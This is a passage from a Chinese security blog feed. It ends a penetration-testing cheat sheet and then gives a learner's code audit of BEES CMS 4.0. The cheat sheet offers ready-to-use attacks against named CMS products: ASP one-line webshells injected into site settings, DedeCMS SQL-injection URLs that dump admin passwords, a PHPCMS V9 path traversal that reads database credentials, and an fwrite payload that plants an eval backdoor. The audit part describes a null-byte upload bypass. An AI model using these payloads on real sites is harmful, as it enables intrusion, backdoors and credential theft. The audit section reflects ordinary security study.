<p>1.网站配置-允许的上传文件类型-插入闭合的一句话木马：”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 不行就增加一个cer格式，之后上传cer格式的木马即可 2.网站配置-网站地址-插入闭合的一句话木马：<a href="http://”%&gt;" target="_blank" rel="noopener">http://”%&gt;</a>&lt;%execute(request(“g”))%&gt;&lt;%’ 3.网站配置-网站名称-插入闭合的一句话木马：沧州临港彩越化工有限公司”%&gt;&lt;%eval request(“g”)%&gt;&lt;%s=” 4.网站配置-版权信息-插入闭合的一句话木马：”%&gt;&lt;%eval(request(chr(103)))%&gt;&lt;%’</p>
<p>（ 利用upfile_other.asp漏洞拿shell ）</p>
<p>直接访问会员中心：userreg.asp</p>
<p>注册一个用户并在未退出登录的状态下，使用双文件上传工具足以爆它菊花，以下代码保存为1.html，并里面的修改目标站，第一个上传jpg，第二个上传cer</p>
<p>另外可以利用会员中心的cookies，用火狐浏览器登陆之后，访问upfile_other.asp页面，用抓包工具去抓包，接着用明小子上传拿shell.</p>
<p>（ 上传漏洞 ）</p>
<p>漏洞文件：Upfile_Photo.asp</p>
<p>前提是进入后台了，访问这个文件，将提示“请先选择你要上传的文件！”，用抓包工具抓管理员的cookies，再把上传地址跟cookies扔到名小子里上传拿shell</p>
<h3 id="（-南方在线编辑器-）"><a href="#（-南方在线编辑器-）" class="headerlink" title="（ 南方在线编辑器 ）"></a>（ 南方在线编辑器 ）</h3><p>默认后台：admin/Southidceditor/admin_style.asp</p>
<p>数据库路径：admin/SouthidcEditorDatasSouthidcEditor.mdb</p>
<p>遍历目录：admin/Southidceditor/admin_uploadfile.asp?id=14&amp;dir=../..</p>
<p>文件上传页面：admin/Southidceditor/ewebeditor.asp?id=57&amp;style=southidc</p>
<p>样式设置页面：admin/SouthidcEditor/Admin_Style.asp?action=styleset&amp;id=47</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="dedecms注入漏洞及找后台技巧"><a href="#dedecms注入漏洞及找后台技巧" class="headerlink" title="dedecms注入漏洞及找后台技巧 :"></a>dedecms注入漏洞及找后台技巧 :</h3><p>访问这个：plus/search.php?keyword=as&amp;typeArr[ uNion ]=a</p>
<p>看结果如果提示：Safe Alert: Request Error step 1 !那么直接用下面的exp爆出所有管理员的帐号密码：</p>
<p>plus/search.php?keyword=as&amp;typeArr[111%3D@’)+and+(SELECT+1+FROM+(select+count(<em>),concat(floor(rand(0)</em>2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+%23@__admin+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@’+]=a</p>
<p>看结果如果提示：Safe Alert: Request Error step 2 !</p>
<p>那么直接用下面的exp爆出所有管理员的帐号密码</p>
<p>plus/search.php?keyword=as&amp;typeArr[111%3D@’)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+%23@__admin%23@’+]=a</p>
<p>有些/plus/目录换成了/plugins/目录，这时就要把/plus/换成/plugins/进行注射了</p>
<p>破解出md5为20位结果，只需要把前三位和后一位去掉，剩余16位拿去解密即可</p>
<p>如何找后台？</p>
<p>默认后台：dede</p>
<p>第一种方法：data/mysql_error_trace.inc （有时可以爆出路径）</p>
<p>第二种方法：把域名作为后台去尝试</p>
<p>第三种方法：查看这个文件：robots.txt</p>
<p>第四种方法：ping下域名获得ip之后，<a href="http://www.bing.com/" target="_blank" rel="noopener">http://www.bing.com/</a> 搜索：ip:127.0.0.1 php （可能获得后台也可以获得其他旁注站，一般dede的旁站很多也是dedecms的）</p>
<p>—————————————————————————————————————————————————————-</p>
<h3 id="PHPcms-V9-爆数据库信息漏洞"><a href="#PHPcms-V9-爆数据库信息漏洞" class="headerlink" title="PHPcms V9 爆数据库信息漏洞:"></a>PHPcms V9 爆数据库信息漏洞:</h3><p>直接爆出数据库连接信息：/index.php?m=search&amp;c=index&amp;a=public_get_suggest_keyword&amp;url=asdf&amp;q=../../phpsso_server/caches/configs/database.php</p>
<p>关于后台拿webshell：进入后台后点击界面–模版风格–随便找个页面点击修改，插入我们的一句话代码</p>
<p>@fwrite($fp, ‘&lt;‘.’?php’.”rnrn”.’eval($_POST[0day])’.”rnrn?”.”&gt;rn”);</p>
<p>点击保存，接着点击可视化，代码就成功执行了，接着菜刀连接/0day.php，密码0day</p>
<p><br></p>
<center><strong>·End·</strong></center></the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> 渗透课程 </tag>
            
            <tag> Mark </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[代码审计实例-BEES_4.0_R_20160525]]></title>
      <url>/2017/12/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E4%BE%8B-BEES-4-0-R-20160525/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>从0到1，从无到有……</p>
<p>开始涉足代码审计，了解了一些敏感函数之后，是时候拿点实例来练练手了！<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<p>把握大局（分析网站结构）-&gt;  通读全文法/敏感函数参数回溯法/定向功能分析法  -&gt; </p>
<p><br></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h3><p>用sexy法师的审计系统扫一扫，发现存在四个地方存在文件上传（move_uploaded_file 函数）</p>
<p>1.admin_pic.php</p>
<blockquote>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fms93w2edbj30su02w0su.jpg" width="50%"></p>
<p>这个只是在图片列表“修改”选项处的重新上传，并将旧照片替换掉，用burp改参数的确可以直接传一个php文件，但是后缀名是不变的，所以没有利用的地方。</p>
</blockquote>
<p>2.fun.php</p>
<blockquote>
<p>定义函数的汇总 php。这里定义了一个 up_img 函数，规定了大小、格式、是否重名……</p>
<p>同样的，上传这一关很容易就bypass过去了。但是仔细审计 up_img 函数就会发现。它的 $file_name 不是直接就从上传那直接获得，而是经过一系列的拼接，估计就是为了防止稍微用burp改一下参数就导致文件上传漏洞的产生吧！</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fmsaj82fhoj30z40a2aaz.jpg" width="50%"></p>
</blockquote>
<p>3.img.class.php</p>
<blockquote>
<p>这里也有一些关于图片信息的函数，文件名是由“年月日时分秒+id（rand）+拓展名（ext）”拼接而成</p>
</blockquote>
<p>4.upload_more.php</p>
<blockquote>
<p>上传多张图片</p>
</blockquote>
<p>在upload.php中测试怎么bypass<img src="https://ws1.sinaimg.cn/large/006tNc79gy1fmt8uyotp9j30tk0cqgm9.jpg" width="50%"></p>
<p>经过上述php的审计，得出他是用白名单策略来检查扩展名，所以就试了下 <strong>nginx空子节漏洞</strong>，用burp在.jpg后加上<strong>%00.php </strong>后发现上传的jpg文件已经被解析为php了。所以…. <strong>:)</strong> </p>
<p>难道只存在解析漏洞？再找找看～～</p>
<p>但是我又在之前已嵌入php代码的png文件中尝试用%00.php 来执行png中的代码，发现不得行：<img src="https://ws3.sinaimg.cn/large/006tNc79gy1fmt9e5nmcxj313e0eeaam.jpg" width="50%"></p>
<p>初步分析是过滤了<strong>%</strong>，<img src="https://ws4.sinaimg.cn/large/006tKfTcly1fmu79c9wx2j30ae01eq2s.jpg" width="30%">但是直接在url上加%后enter，发现，没有被转义啊！<img src="https://ws2.sinaimg.cn/large/006tKfTcly1fmu7a6tic6j308y01a3yc.jpg" width="30%"></p>
<p><strong>But Why？</strong></p>
<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>验证文件头只要为GIF89a，就会返回真</p>
<p>1.admin_pic.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($is_thumb)&#123;<span class="comment">//开启缩略图</span></span><br><span class="line">		$file_info=@getimagesize($file_name);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($file_info))&#123;msg(<span class="string">'图片不存在，操作失败'</span>);&#125;</span><br></pre></td></tr></table></figure>
<p>2.fun.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!move_uploaded_file($file[<span class="string">'tmp_name'</span>],$file_name))&#123;</span><br><span class="line">			msg(<span class="string">'图片上传失败'</span>,<span class="string">''</span>,<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$file_info=@getimagesize($file_name);</span><br><span class="line">			<span class="keyword">switch</span>($file_info[<span class="number">2</span>])&#123;</span><br><span class="line"> 			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"> 			$php_file=@imagecreatefromgif($file_name);</span><br><span class="line"> 			<span class="keyword">break</span>;</span><br><span class="line"> 			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"> 			$php_file=@imagecreatefromjpeg($file_name);</span><br><span class="line"> 			<span class="keyword">break</span>;</span><br><span class="line"> 			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"> 			$php_file=@imagecreatefrompng($file_name);</span><br><span class="line"> 			<span class="keyword">break</span>;</span><br><span class="line"> 			&#125;</span><br></pre></td></tr></table></figure>
<p>上传图片下面有getimagesize()函数，对参数进行处理。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_sys[<span class="string">'image_type'</span>][<span class="number">0</span>])&#123;</span><br><span class="line">				$logo=CMS_PATH.<span class="string">'upload/'</span>.$_sys[<span class="string">'pic'</span>];</span><br><span class="line">				$logo_info=@getimagesize($logo);</span><br><span class="line">				<span class="keyword">switch</span>($logo_info[<span class="number">2</span>])&#123;</span><br><span class="line"> 				<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"> 				$logo_file=@imagecreatefromgif($logo);</span><br><span class="line"> 				<span class="keyword">break</span>;</span><br><span class="line"> 				<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"> 				$logo_file=@imagecreatefromjpeg($logo);</span><br><span class="line"> 				<span class="keyword">break</span>;</span><br><span class="line"> 				<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"> 				$logo_file=@imagecreatefrompng($logo);</span><br><span class="line"> 				<span class="keyword">break</span>;</span><br><span class="line"> 				&#125;</span><br></pre></td></tr></table></figure>
<p>虽然加了png文件头，识别为图片后缀。但是想绕过上传，怕是不大行，因为都是用同一套上传验证机制。这个函数好像在这里好像只是用于读取长宽，并判断后缀名，下面也对postion位置进行case分类[1-2-3]，然后拼接。用imagecopy拷贝一下图像参数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imagecopy($logo_img,$logo_file,$position[<span class="number">0</span>],$position[<span class="number">1</span>],<span class="number">0</span>,<span class="number">0</span>,$logo_info[<span class="number">0</span>],$logo_info[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
<p><a href="https://segmentfault.com/a/1190000003911296" target="_blank" rel="noopener">getimagesize 函数不是完全可靠的</a></p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>遍历了所有包含<strong>include</strong>的文件，全都是直接拼接的路径like “ <strong>include(DATA_PATH.$lang.’_info.php’);</strong> “,没有发现包含来自（$_GET or $POST ）来的文件，所以。。在当前的知识框架下，我好像找不到其他利用的方式，也就无法配合<strong>伪协议+文件上传漏洞</strong>来利用。</p>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><h4 id="先从-file-get-contents-入手"><a href="#先从-file-get-contents-入手" class="headerlink" title="先从 file_get_contents() 入手"></a>先从 <strong>file_get_contents()</strong> 入手</h4><p>1 -&gt; mail.php</p>
<blockquote>
<p>$privKeyStr = file_get_contents($this-&gt;DKIM_private); </p>
<p><strong>DKIM是域名密钥识别邮件标准</strong> ，所以此处应该只是将隐私信息赋给 $privkeystr ，没有发现可控的地方。</p>
<hr>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;$file = tempnam(<span class="string">''</span>, <span class="string">'mail'</span>);</span><br><span class="line">&gt;</span><br><span class="line">&gt;file_put_contents($file, $body); <span class="comment">//TODO check this worked</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;$signed = tempnam(<span class="string">""</span>, <span class="string">"signed"</span>);</span><br><span class="line">&gt;<span class="keyword">if</span> (@openssl_pkcs7_sign($file, $signed, <span class="string">"file://"</span>.<span class="keyword">$this</span>-&gt;sign_cert_file, <span class="keyword">array</span>(<span class="string">"file://"</span>.<span class="keyword">$this</span>-&gt;sign_key_file, <span class="keyword">$this</span>-&gt;sign_key_pass), <span class="keyword">NULL</span>)) &#123;</span><br><span class="line">&gt;</span><br><span class="line">&gt;@unlink($file);</span><br><span class="line">&gt;</span><br><span class="line">&gt;@unlink($signed);</span><br><span class="line">&gt;</span><br><span class="line">&gt;$body = file_get_contents($signed);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
<blockquote>
<p><strong>$signed = tempnam(“”, “signed”);     </strong></p>
<p>// tempnam(dir,prefix)   创建一个具有唯一文件名的临时文件。</p>
<p><strong>@openssl_pkcs7_sign($file, $signed, “file://“.$this-&gt;sign_cert_file, array(“file://“.$this-&gt;sign_key_file, $this-&gt;sign_key_pass), NULL)</strong></p>
<p>// openssl_pkcs7_sign  —&gt; <em>Sign an S/MIME message</em> 好像是一个类似数字签名验证的东西</p>
</blockquote>
<p>$signed 里面的数据是在验证中从 $file 中传过去的，而 $file &lt;- sign_cert_file  ，好像也没有可控的变量 <strong>:(</strong></p>
<hr>
<p>$file_buffer  = file_get_contents($path);</p>
<p>$file_buffer  = $this-&gt;EncodeString($file_buffer, $encoding);  // base64转义</p>
</blockquote>
<p>2 -&gt; admin_db.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($action==<span class="string">'save_import'</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!check_purview(<span class="string">'data_import'</span>))&#123;msg(<span class="string">'&lt;span style="color:red"&gt;操作失败,你的权限不足!&lt;/span&gt;'</span>);&#125;</span><br><span class="line">	$fl = $_GET[<span class="string">'fl'</span>];</span><br><span class="line">	$time = <span class="keyword">isset</span>($_GET[<span class="string">'time'</span>])?$_GET[<span class="string">'time'</span>]:<span class="string">''</span>;</span><br><span class="line">	$rand = <span class="keyword">isset</span>($_GET[<span class="string">'rand'</span>])?$_GET[<span class="string">'rand'</span>]:<span class="string">''</span>;</span><br><span class="line">	$page = <span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])?$_GET[<span class="string">'page'</span>]:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($fl))&#123;err(<span class="string">'&lt;span style="color:red"&gt;参数传递错误,请重新操作&lt;/span&gt;'</span>);&#125;</span><br><span class="line">	<span class="keyword">if</span>($time&amp;&amp;$rand&amp;&amp;$page)&#123;</span><br><span class="line">$import_file =DATA_PATH.<span class="string">'backup/'</span>.$fl.<span class="string">'/db_backup_'</span>.$time.<span class="string">'_'</span>.$rand.<span class="string">'_'</span>.$page.<span class="string">'.sql'</span>;</span><br><span class="line">	<span class="keyword">if</span>(@file_exists($import_file))</span><br><span class="line">	&#123;</span><br><span class="line">		$data=@file_get_contents($import_file);</span><br><span class="line">		$data=explode(<span class="string">";\n"</span>,trim($data));</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">empty</span>($data))&#123;</span><br><span class="line">			<span class="keyword">foreach</span>($data <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">				$GLOBALS[<span class="string">'mysql'</span>]-&gt;query($v);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		show_htm(<span class="string">'卷'</span>.$page.<span class="string">'导入完成'</span>,<span class="string">'?action=save_import&amp;fl='</span>.$fl.<span class="string">'&amp;time='</span>.$time.<span class="string">'&amp;rand='</span>.$rand.<span class="string">'&amp;page='</span>.($page+<span class="number">1</span>).<span class="string">'&amp;nav='</span>.$admin_nav.<span class="string">'&amp;admin_p_nav='</span>.$admin_p_nav);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>$file_get_contents  &lt;- $import_file &lt;-(DATA_PATH.’backup/‘.$fl.’/db<em>backup</em>‘.$time.’<em>‘.$rand.’</em>‘.$page.’.sql’)</p>
<p>其中 <strong>$f1、$time、$rand、$page</strong> 都是通过 $_GET 传递的，所以，是可控的，看看是否有利用的价值。</p>
<blockquote>
<p>三元运算符： <strong>?: </strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; <span class="meta">&lt;?php</span></span><br><span class="line">&gt; &gt; <span class="comment">// Example usage for: Ternary Operator</span></span><br><span class="line">&gt; &gt; $action = (<span class="keyword">empty</span>($_POST[<span class="string">'action'</span>])) ? <span class="string">'default'</span> : $_POST[<span class="string">'action'</span>];</span><br><span class="line">&gt; &gt;</span><br><span class="line">&gt; &gt; <span class="comment">// The above is identical to this if/else statement</span></span><br><span class="line">&gt; &gt; <span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'action'</span>])) &#123;</span><br><span class="line">&gt; &gt;     $action = <span class="string">'default'</span>;</span><br><span class="line">&gt; &gt; &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">&gt; &gt;     $action = $_POST[<span class="string">'action'</span>];</span><br><span class="line">&gt; &gt; &#125;</span><br><span class="line">&gt; &gt; <span class="meta">?&gt;</span></span><br><span class="line">&gt; &gt;</span><br></pre></td></tr></table></figure>
<p>explode() 把字符串打散为数组</p>
<p>trim() 移除字符串两侧的字符</p>
</blockquote>
</blockquote>
<p>3 -&gt; tpl.class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($include_cache)&#123;<span class="keyword">$this</span>-&gt;template_is_cache=<span class="number">0</span>;&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;template_file=<span class="keyword">$this</span>-&gt;template_dir.$template_file.<span class="string">'.html'</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="keyword">$this</span>-&gt;template_file))&#123;<span class="keyword">die</span>(<span class="string">'不存在模板文件'</span>.$template_file.<span class="string">'.html'</span>);&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;template_file_content=file_get_contents(<span class="keyword">$this</span>-&gt;template_file);</span><br><span class="line"><span class="keyword">$this</span>-&gt;template_com_file=<span class="keyword">$this</span>-&gt;template_compile.$template_file.<span class="string">'_'</span>.<span class="keyword">$this</span>-&gt;template_lang.<span class="keyword">$this</span>-&gt;mb.<span class="string">'_compile.php'</span>;<span class="comment">//编译文件</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;cache();<span class="comment">//生成缓存文件</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;compile();<span class="comment">//编译模板</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view($is_copy);<span class="comment">//显示模板</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;tp)&#123;<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;content;&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>$this-&gt;template_file &lt;- $this-&gt;template_dir.$template_file.’.html’ 未发现可控变量，而且模版是直接从数据库中调出，并没有上传模版的地方。</p>
</blockquote>
<h4 id="再从-fread-入手"><a href="#再从-fread-入手" class="headerlink" title="再从 fread() 入手"></a>再从 fread() 入手</h4><p>1 -&gt; fun.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_lang</span><span class="params">($lang)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($lang))&#123;</span><br><span class="line">		<span class="keyword">if</span>(!$fp=@fopen(LANG_PATH.<span class="string">'lang_cn.php'</span>,<span class="string">'r'</span>))&#123;</span><br><span class="line">			msg(<span class="string">'基本语言包不能操作，请检查是否有操作文件的权限'</span>,<span class="string">'javascript:history.go(-1);'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$fl=fread($fp,filesize(LANG_PATH.<span class="string">'lang_cn.php'</span>));</span><br><span class="line">		<span class="keyword">unset</span>($fp);</span><br><span class="line">		$fp2=@fopen(LANG_PATH.<span class="string">'lang_'</span>.$lang.<span class="string">'.php'</span>,<span class="string">'w'</span>);</span><br><span class="line">		<span class="keyword">return</span> fwrite($fp2,$fl);</span><br><span class="line">      </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">creat_inc</span><span class="params">($fl,$str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(file_exists($fl))&#123;@unlink($fl);&#125;</span><br><span class="line">	<span class="keyword">if</span>(!$fp=@fopen($fl,<span class="string">'w'</span>))&#123;</span><br><span class="line">		msg(<span class="string">'文件打开失败,请检查是否有足够的权限操作文件'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	flock($fp,LOCK_EX);</span><br><span class="line">	<span class="keyword">if</span>(!fwrite($fp,$str))&#123;</span><br><span class="line">		msg(<span class="string">'写入文件失败,请检查是否有足够的权限操作文件'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	flock($fp,LOCK_UN);</span><br><span class="line">	<span class="keyword">unset</span>($fp);</span><br></pre></td></tr></table></figure>
<p>生成语言配置文件，好像。。没办法从基本语言包处入手啊！</p>
<p>2 -&gt; admin_template_php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($action==<span class="string">'xg'</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(!check_purview(<span class="string">'tpl_manage'</span>))&#123;msg(<span class="string">'&lt;span style="color:red"&gt;操作失败,你的权限不足!&lt;/span&gt;'</span>);&#125;</span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	$path=CMS_PATH.$file;</span><br><span class="line">	<span class="keyword">if</span>(!$fp=@fopen($path,<span class="string">'r+'</span>))&#123;err(<span class="string">'&lt;span style="color:red"&gt;模板打开失败,请确定【'</span>.$file.<span class="string">'】模板是否存在&lt;/span&gt;'</span>);&#125;</span><br><span class="line">	flock($fp,LOCK_EX);</span><br><span class="line">	$str=@fread($fp,filesize($path));</span><br><span class="line">	$str = str_replace(<span class="string">"&amp;"</span>,<span class="string">"&amp;amp;"</span>,$str);</span><br><span class="line">	$str= str_replace(<span class="keyword">array</span>(<span class="string">"'"</span>,<span class="string">'"'</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>),<span class="keyword">array</span>(<span class="string">"&amp;#39;"</span>,<span class="string">"&amp;quot;"</span>,<span class="string">"&amp;lt;"</span>,<span class="string">"&amp;gt;"</span>),$str);</span><br><span class="line">	flock($fp,LOCK_UN);</span><br><span class="line">	fclose($fp);</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">'template/admin_template_xg.php'</span>);</span><br></pre></td></tr></table></figure>
<p>$path &lt;- CMS_PATH.$file &lt;-$_GET[‘file’]</p>
<p>虽然变量可控，但是好像没有echo的地方啊，也无法形成任意文件读取漏洞～ <strong>:(</strong></p>
<p>​                         </p>
<p>3 -&gt; mail.php</p>
<p><a href="http://blog.nsfocus.net/multiple-php-mail-function-vulnerability-analysis/" target="_blank" rel="noopener">多个PHP mail函数引发的命令执行漏洞分析</a></p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>1-&gt; member.php</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fmww1nf2i1j315q01at8m.jpg" width="50%">登陆的时候随便测试了一下万能密码，发现 <strong>‘</strong> 被 <strong>\’</strong> 转义了，<strong>=</strong> 也被过滤了。</p>
<p>但是在burp上稍微改改参数，但是会显示密码不正确，好像还没看懂如何验证登录。</p>
<p>首页的搜索框是不是也可以看看有没有注入的点？</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fmwwlehuvej308m01adfo.jpg" width="30%">好像一有query语句，就会有x和y……</p>
<p>然后sql语句执行了有上90条～估计是遍历各个地方看看有没有所需的东西。</p>
<h2 id="代码-命令执行"><a href="#代码-命令执行" class="headerlink" title="代码/命令执行"></a>代码/命令执行</h2><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><p>1.mail.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;SingleTo === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;SingleToArray <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!@$mail = popen($sendmail, <span class="string">'w'</span>)) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> phpmailerException(<span class="keyword">$this</span>-&gt;Lang(<span class="string">'execute'</span>) . <span class="keyword">$this</span>-&gt;Sendmail, <span class="keyword">self</span>::STOP_CRITICAL);</span><br><span class="line">        &#125;</span><br><span class="line">        fputs($mail, <span class="string">"To: "</span> . $val . <span class="string">"\n"</span>);</span><br><span class="line">        fputs($mail, $header);</span><br><span class="line">        fputs($mail, $body);</span><br><span class="line">        $result = pclose($mail);</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="NOTES"><a href="#NOTES" class="headerlink" title="NOTES"></a>NOTES</h3><p><a href="https://www.zhihu.com/question/39878368?sort=created" target="_blank" rel="noopener">payload、shellcode、exp、poc怎么区别？</a></p>
<p><a href="http://blog.csdn.net/hanliuxinming/article/details/20871165" target="_blank" rel="noopener">php中$this-&gt;是什么意思？</a></p>
<p><a href="http://blog.csdn.net/u012767263/article/details/16952757" target="_blank" rel="noopener">PHP中的符号 -&gt;、=&gt; 和 :: 分别表示什么意思?</a></p>
